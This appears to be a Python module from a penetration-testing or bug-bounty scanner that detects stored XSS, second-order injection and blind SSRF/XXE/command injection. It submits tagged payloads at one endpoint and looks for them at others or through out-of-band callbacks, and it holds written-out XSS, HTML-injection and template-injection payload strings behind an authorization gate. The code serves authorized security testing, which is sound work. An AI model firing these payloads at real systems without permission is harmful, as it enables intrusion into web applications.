"""
Stored / second-order vulnerability detection (improvement #1 — the real model gap).

Every other scanner in the attack section is single-request and in-band: inject at an endpoint, judge
the SAME response. Stored XSS, second-order SQLi, and stored/second-order SSRF are invisible to that
model — the payload is persisted at endpoint A and fires later at endpoint B (or in a back-office an
attacker never sees). `StoredVulnTester` adds the missing primitive:

    SUBMIT a uniquely-tagged payload at A  →  OBSERVE one or more endpoints B  →  correlate the tag.

Two correlation channels:
  * in-band canary — a unique nonce is embedded in the payload; finding the nonce REFLECTED at a
    DIFFERENT endpoint proves persistence (stored reflection). For XSS, a real headless DOM execution
    (the injected `browser_confirmer`) is the independent second signal → CONFIRMED stored XSS;
    reflection alone at B is reported `suspected` (validation-first).
  * out-of-band — for blind/second-order SSRF/XXE/cmdi the payload embeds an OOB callback
    (`OOBCorrelator`); a later interaction at the operator's collaborator confirms it (handles the
    "fires only when an admin opens it" case via a bounded poll).

Gated (deny-by-default on the submit AND every observe target), PoC-only (benign canary / callback,
nothing destructive). Network only via the injected executor. Deterministic given the executor.
"""

from __future__ import annotations

import hashlib
import time
from typing import Callable, Dict, List, Optional

from hydra.attack.evidence import EvidenceCollector
from hydra.attack.injection_points import InjectionPointFinder
from hydra.attack.oob import ListenerConfig, OOBCorrelator
from hydra.attack.two_signal import Signal, TwoSignalConfirmer

# payload templates carrying a unique nonce so a hit at B is unambiguously OUR injection.
_STORED_PAYLOADS = {
    "xss": '"><svg onload=alert(/{n}/)>{n}',
    "html_injection": "<h1>{n}</h1>",
    "ssti": "{{{{7*7}}}}{n}",
}


def _canary(submit_url: str, field: str, vuln_class: str) -> str:
    h = hashlib.sha1(f"{submit_url}|{field}|{vuln_class}".encode()).hexdigest()[:10]
    return f"hydrastored{h}"


class StoredVulnTester:
    def __init__(self, gate=None, executor=None,
                 correlator: Optional[OOBCorrelator] = None,
                 browser_confirmer: Optional[Callable[[str], Dict]] = None,
                 finder: Optional[InjectionPointFinder] = None,
                 evidence: Optional[EvidenceCollector] = None,
                 two_signal: Optional[TwoSignalConfirmer] = None,
                 oob_domain: str = "oob.invalid"):
        if gate is None:
            from hydra.authorization import BugBountyAuthorizationGate
            gate = BugBountyAuthorizationGate()
        self.gate = gate
        if executor is None:
            from hydra.attack_runtime import HttpExecutor
            executor = HttpExecutor(gate=gate)
        self.executor = executor
        self.correlator = correlator or OOBCorrelator(ListenerConfig(oob_domain=oob_domain))
        self.browser_confirmer = browser_confirmer
        self.finder = finder or InjectionPointFinder()
        self.evidence = evidence or EvidenceCollector()
        self.two_signal = two_signal or TwoSignalConfirmer()

    def _submit_request(self, submit_req: Dict, field: str, value: str, session) -> Dict:
        """Place `value` into `field` of the submit request (json/body/query aware)."""
        req = dict(submit_req)
        req.setdefault("method", "POST")
        req.setdefault("headers", {})
        points = {p.name: p for p in self.finder.find(req)}
        if field and field in points:
            req = points[field].apply(value)
        else:                                            # no named field → first injectable point
            pts = self.finder.find(req)
            req = pts[0].apply(value) if pts else {**req, "body": value}
        req["payload"] = value
        if session is not None:
            req = session.apply(req)
        return req

    def test(self, submit_req: Dict, observe_urls: List[str], vuln_class: str = "xss",
             field: str = "", session=None, oob: bool = False, finding_id: str = "stored-poc",
             poll_wait: float = 0.0, poller: Optional[Callable[[], List[Dict]]] = None) -> Dict:
        vc = vuln_class.lower()
        submit_url = submit_req.get("url", "")
        decision = self.gate.authorize(submit_url, "exploitation")
        if not decision.authorized:
            return {"authorized": False, "reason": decision.reason, "advisory": True}

        if oob:                                          # blind / second-order via OOB callback
            return self._test_oob(submit_req, vc, field, session, finding_id, poll_wait, poller)

        nonce = _canary(submit_url, field, vc)
        template = _STORED_PAYLOADS.get(vc, "{n}")
        payload = template.format(n=nonce)
        submit_resp = self.executor(self._submit_request(submit_req, field, payload, session))

        observed: List[Dict] = []
        confirmed: List[Dict] = []
        for url in observe_urls:
            d = self.gate.authorize(url, "exploitation")
            if not d.authorized:
                observed.append({"url": url, "authorized": False, "reason": d.reason})
                continue
            req = {"method": "GET", "url": url, "headers": {}}
            if session is not None:
                req = session.apply(req)
            resp = self.executor(req)
            body = (resp.get("body_snippet") or "")
            ct = (resp.get("content_type") or "").lower()
            persisted = nonce in body                    # our tag came back at a DIFFERENT endpoint
            signals: List[Signal] = []
            if persisted:
                signals.append(Signal("reflection", f"stored canary reflected at {url}"))
            # second independent signal: real DOM execution of the stored XSS
            if persisted and vc == "xss" and self.browser_confirmer and \
                    ("html" in ct or "xml" in ct or not ct):
                bc = self.browser_confirmer(url) or {}
                if bc.get("confirmed"):
                    signals.append(Signal("dom_execution", "stored XSS executed in headless DOM"))
                    resp["dom_executed"] = True
            conf = self.two_signal.assess(signals)
            row = {"url": url, "authorized": True, "persisted": persisted,
                   "verdict": conf.verdict, "confirmation": conf.to_dict()}
            observed.append(row)
            if conf.verdict == "confirmed":
                ev = self.evidence.capture(vc, req, resp,
                                           indicators=[s.detail for s in signals],
                                           confirmed=True).to_dict()
                confirmed.append({"vuln_class": vc, "submit_url": submit_url, "observe_url": url,
                                  "verdict": "confirmed", "evidence": ev})
        any_persist = any(o.get("persisted") for o in observed)
        return {"vuln_class": vc, "submit_url": submit_url, "authorized": True, "poc_only": True,
                "canary": nonce, "submit_status": submit_resp.get("status"),
                "observed": observed, "persisted": any_persist,
                "confirmed": bool(confirmed), "confirmed_findings": confirmed,
                "note": "payload persisted at a different endpoint than where it was submitted "
                        "(second-order); two signals (stored reflection + DOM execution) confirm XSS",
                "advisory": True}

    def _test_oob(self, submit_req: Dict, vc: str, field: str, session, finding_id: str,
                  poll_wait: float, poller) -> Dict:
        token = self.correlator.mint(finding_id, vc)
        payloads = self.correlator.payloads(vc, token.callback_url)
        if not payloads:
            return {"authorized": True, "error": f"no OOB payloads for '{vc}'",
                    "supported": ["ssrf", "xxe", "cmdi", "xss", "sqli"], "advisory": True}
        sent = 0
        for p in payloads:
            self.executor(self._submit_request(submit_req, field, p["value"], session))
            sent += 1
        if poll_wait > 0:
            time.sleep(min(poll_wait, 30.0))             # second-order: fires when B processes it
        interactions: List[Dict] = []
        if poller is not None:
            try:
                interactions = poller() or []
            except Exception:
                interactions = []
        correlation = self.correlator.correlate(interactions)
        return {"vuln_class": vc, "submit_url": submit_req.get("url", ""), "authorized": True,
                "poc_only": True, "mode": "oob", "oob_callback": token.callback_url,
                "payloads_sent": sent, "confirmed": correlation["count"] > 0,
                "confirmed_blind_findings": correlation["confirmed_blind_findings"],
                "note": "stored/second-order blind finding CONFIRMED when an out-of-band interaction "
                        "returns to your collaborator (possibly later, when the value is processed)",
                "advisory": True}
